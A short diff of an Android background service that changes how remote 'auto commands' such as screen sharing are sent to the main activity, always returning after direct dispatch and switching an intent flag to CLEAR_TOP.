@@ -451,18 +451,16 @@ public class BackgroundKeepAliveService extends Service {
             RemoteAccessibilityService.triggerAutoAccept(this);
         }
 
-        // 1. If MainActivity is already running in background, dispatch directly!
+        // 1. If MainActivity is already running in background, dispatch directly and return!
         if (MainActivity.getInstance() != null) {
             MainActivity.getInstance().runOnUiThread(() -> {
                 MainActivity.getInstance().handleAutoCommandDirectly(command, caller, cameraChoice);
             });
-            if (!"screen_share".equals(command) && !"screen_share_control".equals(command)) {
-                return;
-            }
+            return;
         }
 
         Intent intent = new Intent(this, MainActivity.class);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
         intent.putExtra("auto_command", command);
         intent.putExtra("caller", caller);
         intent.putExtra("cameraChoice", cameraChoice);
